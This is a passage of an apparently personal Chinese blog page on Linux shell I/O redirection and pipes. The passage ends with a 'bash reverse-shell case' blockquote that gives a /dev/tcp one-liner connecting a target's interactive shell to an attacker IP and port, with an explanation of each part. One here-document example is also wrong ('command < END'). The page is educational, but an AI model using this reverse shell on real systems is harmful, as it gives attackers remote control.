+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command &gt; output.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>标准输出追加重定向（<code>&gt;&gt;</code>）：使用 <code>&gt;&gt;</code> 将命令的输出追加到文件末尾，而不覆盖原有内容。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command &gt;&gt; output.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>标准错误输出重定向（<code>2&gt;</code>）：使用 <code>2&gt;</code> 将命令的错误输出重定向到文件中。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command 2&gt; error.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>标准输出和错误输出合并重定向（<code>&amp;&gt;</code> 或 <code>&gt;</code>）：使用 <code>&amp;&gt;</code> 或 <code>&gt;</code> 将命令的标准输出和错误输出合并重定向到文件中。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command &amp;&gt; output.txt
+</span></span><span class="line"><span class="cl">或
+</span></span><span class="line"><span class="cl">command &gt; output.txt 2&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>管道（<code>|</code>）：使用 <code>|</code> 将一个命令的输出作为另一个命令的输入。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command1 | command2
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>标准输入重定向（<code>&lt;</code>）：使用 <code>&lt;</code> 将命令的输入从文件中读取。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command &lt; file
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将 <code>file</code> 文件中的内容作为 <code>command</code> 的输入。</p>
+</li>
+<li>
+<p>标准输入重定向（<code>&lt;</code>）：使用 <code>&lt;</code> 从标准输入（键盘）中读取数据，直到遇见分界符 <code>END</code> 才停止。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command &lt; END
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从标准输入（键盘）中读取数据，直到遇见分界符 <code>END</code> 才停止。</p>
+</li>
+<li>
+<p>标准输出和输入重定向（<code>&lt;</code> 和 <code>&gt;</code>）：使用 <code>&lt;</code> 将文件 <code>file1</code> 作为 <code>command</code> 的输入，并将 <code>command</code> 的处理结果输出到文件 <code>file2</code>。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">command &lt; file1 &gt; file2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将 <code>file1</code> 作为 <code>command</code> 的输入，并将 <code>command</code> 的处理结果输出到 <code>file2</code>。</p>
+</li>
+<li>
+<p>标准输入重定向和命令行参数结合使用（<code>&lt;</code> 和 <code>&lt;&lt;</code>）：使用 <code>&lt;</code> 将文件 <code>test.txt</code> 作为输入，并使用 <code>wc -l</code> 命令统计文件中的行数。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wc -l &lt; test.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>统计 <code>test.txt</code> 文件中的行数。</p>
+</li>
+<li>
+<p>标准输入重定向和Here文档结合使用（<code>&lt;&lt;</code>）：使用 <code>&lt;&lt;</code> 从标准输入（键盘）中读取数据，直到遇见分界符 <code>END</code> 才停止，并使用 <code>wc -l</code> 命令统计输入文本的行数。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wc -l &lt;&lt; END
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>统计用户在终端输入的文本的行数，直到遇见分界符 <code>END</code> 才停止。</p>
+</li>
+</ol>
+<blockquote>
+<p>bash反弹连接案例</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/192.168.142.44/7777 0&gt;&amp;1</code></p>
+<p><code>bash -i </code>：在靶机打开交互式的Shell</p>
+<p><code>/dev/tcp/192.168.142.44/7777 </code>：连接到攻击机IP端口</p>
+<p><code>&gt;&amp; </code>和 <code>&amp;&gt;</code>等价，代表标准输出1 + 错误输出2；把靶机的输出重定向到攻击机——接收结果</p>
+<p><code>0&gt;&amp;1</code>：左边是标准输入。右边是标准输出，输出重定向。把靶机的输入重定向为攻击机的输出——接收命令</p>
+<p>这条命令的作用：靶机的输入输出都到了攻击机上</p>
+</blockquote>
+</div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E5%8F%8A%E8%A7%A3%E5%8E%8B%E7%BC%A9/" class="prev" rel="prev" title=""><i class="fas fa-angle-left fa-fw"></i></a>
+            <a href="/kali%E5%85%B3%E9%97%AD%E9%94%81%E5%B1%8F/" class="next" rel="next" title=""><i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">闽ICP备2023013172号</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
